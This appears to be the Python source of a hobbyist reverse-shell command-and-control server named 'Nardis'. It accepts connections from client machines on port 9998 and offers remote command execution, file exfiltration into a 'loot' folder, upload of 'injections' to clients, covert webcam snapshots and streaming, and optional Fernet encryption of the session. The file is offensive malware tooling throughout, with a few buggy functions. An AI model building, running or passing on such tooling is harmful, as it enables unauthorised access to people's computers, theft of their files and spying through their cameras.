""" Nardis Reverse Shell Terminal Created by "Arturo"
Connects to terminal of sockets on port 9998 and can execute a
variety of commands beyond shell piping over a network, such as
basic exfiltration and file transfer.
Created 5/2020 during finals.
"""

import os
import socket
import sys
import threading
import time
from os import path
from datetime import datetime
from queue import Queue
from cryptography.fernet import Fernet

import cv2
import imageio

NUM_OF_THREADS = 2
JOB_INDEX = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []
CURRENT_HOSTNAME = ""
TESTBOOL = True
SECURE = False

# Welcome Screen
# print("\n _  _    __    ____  ____  ____  ___ ")
# print("( \( )  /__\  (  _ \(  _ \(_  _)/ __)")
# print(" )  (  /(__)\  )   / )(_) )_)(_ \__ \\")
# print("(_)\_)(__)(__)(_)\_)(____/(____)(___/\n")
print("")
print("\t\t███╗   ██╗ █████╗ ██████╗ ██████╗ ██╗███████╗")
print("\t\t████╗  ██║██╔══██╗██╔══██╗██╔══██╗██║██╔════╝")
print("\t\t██╔██╗ ██║███████║██████╔╝██║  ██║██║███████╗")
print("\t\t██║╚██╗██║██╔══██║██╔══██╗██║  ██║██║╚════██║")
print("\t\t██║ ╚████║██║  ██║██║  ██║██████╔╝██║███████║")
print("\t\t╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚══════╝\n")

print("------ Welcome to the Nardis Reverse Shell Terminal. Type 'help' for options ------")

#                           1st Thread - Create, bind, and listen for sockets

def create_socket():
    """ Creates a socket (Connects two computers) """
    try:
        global HOST
        global port
        global s
        HOST = "" # Default Value
        port = 9998 # Arbitrary unused port
        s = socket.socket()
    except socket.error as msg1:
        print("socket creation error..." + msg1)

def bind_socket():
    """ Binds socket host to port and listens for connections """
    try:
        global HOST
        global port
        global s

        #print("Binding the Port " + str(port) + "\nNardis > ",end="")

        s.bind((HOST, port))
        s.listen(5)

    except socket.error as msg2:
        print("socket binding error...\n" + str(msg2) + "\n Retrying..." + '\nNardis > ', end="")
        bind_socket()

def accepting_connections():
    """ Handles connections from multiple clients and saves to a list
        Closes Previous Connections when rs_server.py file is restarted """
    global TESTBOOL
    for net_conn in all_connections:
        net_conn.close()
    del all_connections[:]
    del all_addresses[:]
    while TESTBOOL: # originally while True
        try:
            connection, address = s.accept()
            s.setblocking(1) # prevents client timeouts - intially s.setblocking(0)
            all_connections.append(connection)
            all_addresses.append(address)
            print("New connection established. | IP: " + address[0] + " | Port: "
                  + str(address[1]) + "\nNardis > ", end="")
            update_log("Established connection with " + address[0] + ":" + str(address[1]))
        except:
            print("Error accepting connections.")

#                                          Utility functions

# Create Initial Log File - if a file was already created for today, aborts
def create_log():
    """ creates daily log with general updates about activity of nardis """

    dtt = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    day = dtt[:10]
    
    try:
        with open("./logs/" + day + ".txt", "r") as f_r:
            pass
    except FileNotFoundError:
        with open("./logs/" + day + ".txt", "w") as f_w:
            f_w.write("LOGS FOR " + day + "\n")

create_log()

# Updates Log File
def update_log(msg):
    """ appends message on process performed with timestamp to daily log file """
    dtt = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    day = dtt[:10]
    with open("logs/" + day + ".txt", "a") as file_update:
        file_update.write("\n[" + str(dtt) + "] > " + msg)

# function that sends confirmation message and returns boolean
def confirmation(i):
    """ confirmation - quick input confirmation prompt that returns a boolean """
    valid_answer = False
    while not valid_answer:
        print("Are you Sure? [Y/n]")
        if i == 1:
            print(CURRENT_HOSTNAME, end="")
        else:
            print("Nardis", end="")
        ans = input(" > ")
        if (ans == "y" or ans == "Y"):
            return True
        elif (ans == "n" or ans == "N"):
            return False
        else:
            print("input error...")

def basic_encryption(msg):
    if os.path.isfile("rs_encrypt.key"):
        with open("rs_encrypt.key", "rb") as key_file:
            key = key_file.read()
        fern = Fernet(key)
        return fern.encrypt(msg.encode())
    else:
        print("Missing key file...")
        return "uh_oh_1997"

def basic_decryption(msg):
    if os.path.isfile("rs_encrypt.key"):
        with open("rs_encrypt.key", "rb") as key_file:
            key = key_file.read()
        fern = Fernet(key)
        return fern.decrypt(msg).decode("utf-8")
    else:
        print("Missing key file...")
        return "uh_oh_1997"

#                   Second Thread - See all clients, select a client, and send commands to connected client

# Interactive prompt for sending commands
def start_Nardis():
    while True:
        cmd = input('Nardis > ')
        if cmd == 'list':
            list_connections(1)
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif cmd == "showinj":
            show_injections(0)
        elif cmd == "reset":
            for i in range(3):
                list_connections(0)
                time.sleep(.5)
                print("resetting...")
            print("Connection reset.")
        elif "man " in cmd[:4]:
                show_man(cmd)
        elif cmd == 'help':
            print("\n\tMAIN SHELL:\n\tlist - show active connections.\n\tselect - connect to a socket"
            + "\n\tshowinj - list injections on server")
            print("\treset - resets connections if clients keep crashing")
            print("\n\tINSIDE SOCKET")
            print("\tgrab - copy file to server\n\tgive - upload file to client (WIP)\n\tbreak - disconnect and close socket.")
            print("\tfatgrab/fatgive - for non-text based files. Tries large single packet transfer to/from server.")
            print("\texit - return to main terminal (socket remains connected)\n\twrite - leaves a message in a txt file on client computer.\n")
        elif cmd == 'quit' or cmd == 'exit':
            break
            # sys.exit("Shutting down Nardis...")
        else:
            print("Try typing something else.")

# Displays all current active connections with clients
def list_connections(i):
    """ list_connections(i) \n lists connected sockets by order of index """
    results = ''
    for id_index, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' ')) # test connection by sending an empty string
            conn.recv(20480)
        except:
            del all_connections[id_index]
            del all_addresses[id_index]
            continue

        results = "\n\t" + str(id_index) + '   ' + str(all_addresses[id_index][0]) + '   ' + str(all_addresses[id_index][1]) + '\n'
    if i == 1:
        print("\n\t<------ Clients ------>\n" + results + "\n")

# Displays contents of injection folder on server
def show_injections(i):
    """ displays contents of injection folder """
    print("\n\t"+"INJECTIONS:")
    for root, dirs, files in os.walk("./injections/"):
        for fname in files:
            print("\t"+fname)
    print("\0")
    if i == 1:
        print(CURRENT_HOSTNAME + " > ", end="")

def show_man(cmd):
    """ man - displays docstring of each function """
    info_request = cmd.replace("man ", "")
    if info_request == "write":
        print(write_to_file.__doc__)
    elif info_request == "grab":
        print(transfer_to_server.__doc__)
    elif info_request == "give":
        print(transfer_to_client.__doc__)
    elif info_request == "list":
        print(list_connections.__doc__)
    elif info_request == "fat":
        print(fat_transfer_to_server.__doc__)
    elif info_request == "showinj":
        print(show_injections.__doc__)
    elif info_request == "snapshot":
        print(transer_camera_frame.__doc__)
    else:
        print("Selection not in man.")

def get_target(cmd):
    """ Takes IP connection from list and uses as main socket for io """
    global CURRENT_HOSTNAME
    try:
        target = int(cmd.replace('select ', '')) # target is trimmed to be ID and converted to int
        # target = int(target) # converts to int
        conn = all_connections[target]
        print("Connection established. Target: " + str(all_addresses[target][0]) + " | Port: " + str(all_addresses[target][1]))
        update_log("Connected with " + str(all_addresses[target][0]) + ":" + str(all_addresses[target][1]))
        CURRENT_HOSTNAME = str(all_addresses[target][0])
        print(str(all_addresses[target][0]) + "> ", end="")
        return conn
    except ValueError:
        print("Invalid selection.")
        return None
    except IndexError:
        print("Index not in list. (use 'list' command for details)")
        return None



#               File Transfer Functions
def transfer_to_server(conn, cmd):
    """ grab - sends simple file from current working directory folder to loot folder """
    global CURRENT_HOSTNAME
    conn.send(str.encode(cmd))
    path = cmd.replace("grab ", "")
    if path[0] == ".":
        path = path[1:]
    if path[0] == "/":
        path = path[1:]
    with open("./loot/"+path, "wb") as f_w:
        while True:
            bits = conn.recv(1024)
            bit_string = bits.decode("utf-8")
            if bit_string == 'Unable to find file832':
                print("Cannot find file. Try again.\n" + CURRENT_HOSTNAME + " > ", end="")
                os.remove("./loot/"+path)
                break
            if 'ENDOFFILE832' in bit_string:
                update_log("Exfiltrated " + path)
                print("Transfer completed.\n" + CURRENT_HOSTNAME + "> ", end="")
                break
            f_w.write(bits)

def transfer_to_client(conn, cmd):
    """ give - sends simple file from injection folder to client """
    size_of_packets = 1024
    path = cmd.replace("give ", "")
    if os.path.exists("./injections/"+path):
        conn.send(str.encode(cmd))
        f_r = open("injections/" + path, "rb")
        bits = f_r.read(size_of_packets)
        while bits.decode("utf-8") != '':
            conn.send(bits)
            bits = f_r.read(size_of_packets)
        conn.send(str.encode("end of file832"))
        f_r.close
        update_log("Sent " + path + " to client.")
        print("Transfer completed.\n" + CURRENT_HOSTNAME + "> ", end="")
    else:
        print("File does not exist...\n"+ CURRENT_HOSTNAME + "> ", end="")

def write_to_file(conn, cmd):
    """ write - writes a simple message line by line to a txt file on client's computer """
    print("trying write - type 'EXIT' to save")
    conn.send(str.encode(cmd))
    conn.send(str.encode("")) # initializes
    line = ""
    confirm = conn.recv(1024)
    conf_dec = confirm.decode("utf-8")
    while conf_dec == "line_received":
        line = input("# ") + "\n"
        conn.send(line.encode)

def transer_camera_frame(conn, cmd):
    """ snapshot n - sends single image from camera to server (where n is index of cameras) """
    conn.send(str.encode(cmd))
    time.sleep(1)
    name = conn.recv(1024)
    name_decode = name.decode("utf-8")
    print("Capturing: " + name_decode)
    if name_decode == 'couldnotsendfile222':
        print("Could not send file...")
    elif name_decode == 'webcamerror00':
        print("Camera error...")
    elif name_decode == "invalid_camera_excpetion222":
        print("Invalid camera selection...")
    else:
        print("Receiving... " + name_decode)
        f = open("loot/snapshots/" + name_decode, 'wb')
        while True:
            data = conn.recv(4096)
            print("Receiving image..." + str(sys.getsizeof(data)))
            if sys.getsizeof(data) <= 4096:
                f.write(data)
                print("Snapshot successful.")
                update_log("Got image: " + name_decode[2:])
                time.sleep(1)
                #outpt = conn.recv(1024)
                #print("recvd cwd")
                #print(outpt.decode("utf-8"))
                f.close
                break
            else:
                f.write(data)
    print(CURRENT_HOSTNAME + " > ", end="")

def get_frame(conn):
    """Quick send of low quality image..."""
    conn.send(str.encode("requesting_capture221")) # Image request
    image_confirm = conn.recv(1024)
    if image_confirm.decode("utf-8") == "capture_acknowledged221":
        conn.send(str.encode("ready_for_capture221"))
        image_bits = conn.recv(40960000)
        return image_bits
    else:
        return str.encode("image_not_available")

def request_video_feed(conn, cmd):
    """ stream - send stream of images from client's camera """
    conn.send(str.encode(cmd))
    confirmation_packet = conn.recv(1024)
    if confirmation_packet.decode("utf-8") == "ready_for_video414":
        while True:
            # Capture image
            frame = conn.recv(40960000)
            # makes gray I guess. Comment out the imshow to rgb
            """gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)"""
            # Display the resulting frame
            print("about to show frame...") 
            cv2.imshow('frame'""", gray""")
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
    else:
        print("Client could not capture...")


def fat_transfer_to_server(conn, cmd):
    """ fatgrab - tries whole tranfer of a file to the server """
    conn.send(str.encode(cmd))

    print("Trying fatgrab transfer...")
    name = conn.recv(1024)
    if name.decode("utf-8") != "filenotfound23123":
        print("Collecting: " + name.decode("utf-8"))
        time.sleep(1)
        try:
            with open("loot/" + name.decode("utf-8"), "wb") as fat_file:
                data = conn.recv(40960000)
                fat_file.write(data)
            update_log("Fat transferred " + name.decode("utf-8") + "to server.")
            print("Transfer completed.\n" + CURRENT_HOSTNAME + " > ", end="")
        except Exception as error_msg:
            print(str(error_msg))
            print("Could not transfer...")
    else:
        print("File not found...")

def fat_transfer_to_client(conn, cmd):
    """ fatgive - tries whole transfer of an injection to the client """
    conn.send(str.encode(cmd))
    print("Trying fatgive transfer...")
    can_open = conn.recv(1024)
    if can_open.decode("utf-8") == "can_open212":
        try:
            fat_inj = open("./injections/" + cmd.replace("fatgive ", ""), "rb")
            data = fat_inj.read()
            print("Loaded file contents to memory...", end="")
            sizeofdata = sys.getsizeof(data)
            print(str(sizeofdata))
            conn.send(str(sizeofdata).encode())
            print("Delivered content size to client...")
            conn.recv(1024)
            print("Sening data to client...")
            conn.send(data)
            print("Transfer Complete.")
            update_log("Fat transferred " + cmd.replace("fatgive ", ""))
            print(CURRENT_HOSTNAME, end=" > ")
        except FileNotFoundError:
            print("Error: file does not exist...")
            print(CURRENT_HOSTNAME + " > ", end="")
        except Exception as error_msg:
            print(str(error_msg))
            print("fatgive error...")
            print(CURRENT_HOSTNAME + " > ", end="")
    else:
        print("fatgive error...")
        print(CURRENT_HOSTNAME + " > ", end="")

def transfer_to_client_plus(conn, cmd):
    """ plus transfer: allows for transfer on non-text based digital media """
    size_of_packets = 1024
    path = cmd.replace("giveplus ", "")
    if os.path.exists("./injections/" + path):
        conn.send(str.encode(cmd))
        f_r = open("injections/" + path, "rb")
        bits = f_r.read(size_of_packets)
        while sys.getsizeof(bits) >= 1024:
            conn.send(bits)
            bits = f_r.read(size_of_packets)
        # conn.send(str.encode("end of file832"))
        f_r.close()
        update_log("Sent " + path + " to client.")
        print("Transfer completed.\n" + CURRENT_HOSTNAME + "> ", end="")
    else:
        print("File does not exist...\n"+ CURRENT_HOSTNAME + "> ", end="")


# infinite loop to send commands to target
def send_target_commands(conn):
    """ infinite loop to send commands to target """
    while True:
        try:
            cmd = input()
            if cmd == 'quit' or cmd == 'exit':
                break

            if cmd == "encrypt" or cmd == "unencrypt":
                if cmd == "encrypt":
                    if os.path.isfile("rs_encrypt.key"):
                        print("Beginning encrypted session.")
                        conn.send(str.encode("encrypt"))
                    else:
                        print("Missing rs_encrypt.key file. Please add to RS folder.")
                if cmd == "unencrypt":
                    cmd = basic_encryption("unencrypt")
                    conn.send(cmd)

            elif cmd.startswith("fatgrab "):
                try:
                    fat_transfer_to_server(conn, cmd)
                except Exception as error_msg:
                    print(str(error_msg))
                    print("\nfatgrab error...\n" + CURRENT_HOSTNAME + " > ", end="")

            elif cmd.startswith("grab "):
                try:
                    transfer_to_server(conn, cmd)
                except Exception as error_msg:
                    print(str(error_msg))
                    print("grab error...\n" + CURRENT_HOSTNAME + " > ", end="")

            elif cmd.startswith("fatgive "):
                try:
                    fat_transfer_to_client(conn, cmd)
                except Exception as error_msg:
                    print(str(error_msg))
                    print("fatgive error...\n" + CURRENT_HOSTNAME + " > ", end="")

            elif cmd.startswith("giveplus "):
                try:
                    transfer_to_client_plus(conn, cmd)
                except Exception as error_msg:
                    print(str(error_msg))
                    print("giveplus error...\n" + CURRENT_HOSTNAME + " > ", end="")

            elif cmd.startswith("give "):
                try:
                    transfer_to_client(conn, cmd)
                except Exception as error_msg:
                    print(str(error_msg))
                    print("give error...\n" + CURRENT_HOSTNAME + " > ", end="")

            elif cmd == "showinj":
                try:
                    show_injections(1)
                except Exception as error_msg:
                    print(str(error_msg))
                    print("\ncannot show injections...\n" + CURRENT_HOSTNAME + " > ", end="")
            
            elif cmd == "security":
                if SECURE:
                    print("Session is currently encrypted.\n" + CURRENT_HOSTNAME + " > ", end="")
                if not SECURE:
                    print("Session is not encrypted.\n" + CURRENT_HOSTNAME + " > ", end="")

            elif cmd.startswith("write "):
                try:
                    write_to_file(conn, cmd)
                except Exception as error_msg:
                    print(str(error_msg))
                    print("\nwrite error...\n" + CURRENT_HOSTNAME + " > ", end="")

            elif cmd == "break":
                #conf = confirmation(1)
                if confirmation(1):
                    conn.send(str.encode(cmd))
                    conn.close
                    update_log("Disconnected from " + CURRENT_HOSTNAME)
                    list_connections(0)
                    print("Disconnected.")
                    break
                else:
                    print(CURRENT_HOSTNAME + " > ", end="")

            elif cmd.startswith("man "):
                try:
                    show_man(cmd)
                except Exception as error_msg:
                    print(str(error_msg))
                    print("\n man error...\n")

            elif cmd.startswith("snapshot "):
                try:
                    if len(cmd) > 8:
                        camera = int(cmd.replace("snapshot ", ""))
                        transer_camera_frame(conn, cmd)
                    else:
                        print("Invalid selection...\n" + CURRENT_HOSTNAME + " > ", end="")
                except ValueError:
                    print("Invalid selection...\n" + CURRENT_HOSTNAME + " > ", end="")
                except Exception as error_msg:
                    print(str(error_msg))
                    print("snapshot error...\n" + CURRENT_HOSTNAME + " > ", end="")

            elif cmd == "stream":
                try:
                    request_video_feed(conn, cmd)
                except Exception as error_msg:
                    print(str(error_msg))
                    print("stream error..." + CURRENT_HOSTNAME + " > ", end="")

            #elif cmd == "screenshot":

            elif len(str.encode(cmd)) > 0:
                if cmd == "ll":
                    cmd = "ls -ahl"
                if SECURE:
                    encrypted = basic_encryption(cmd)
                    conn.send(encrypted)
                elif not SECURE:
                    conn.send(cmd.encode())
                client_response = str(conn.recv(20480), "utf-8")
                if SECURE:
                    client_response = basic_decryption(client_response)
                    print(client_response, end="")
                if not SECURE:
                    print(client_response, end="")

        except:
            print("Error sending commands. Try checking connection...")
            break

# Thread functions - eventually how to skip the thread list appending
def create_threads():
    """ creates threads and starts each with daemon """
    for _ in range(NUM_OF_THREADS):
        thr = threading.Thread(target=work)
        thr.daemon = True
        thr.start()


# Does next job in queue (1 - handle connnections, 2 - send commands)
def work():
    """ sorts jobs for threads to both create and accept sockets
        or start Nardis terminal """
    global TESTBOOL
    while True:
        job_q = queue.get()
        if job_q == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if job_q == 2:
            start_Nardis()
            TESTBOOL = False
            break

    queue.task_done()
    print("tasks are done")

def create_jobs():
    """ takes jobs and indexes them into queue """
    for job_q in JOB_INDEX:
        queue.put(job_q)
    queue.join()

try:
    create_threads()
    create_jobs()
except KeyboardInterrupt:
    print("\nClosed Nardis Terminal.")
#except EOFError:
#    print("\nClosed Nardis Terminal.")
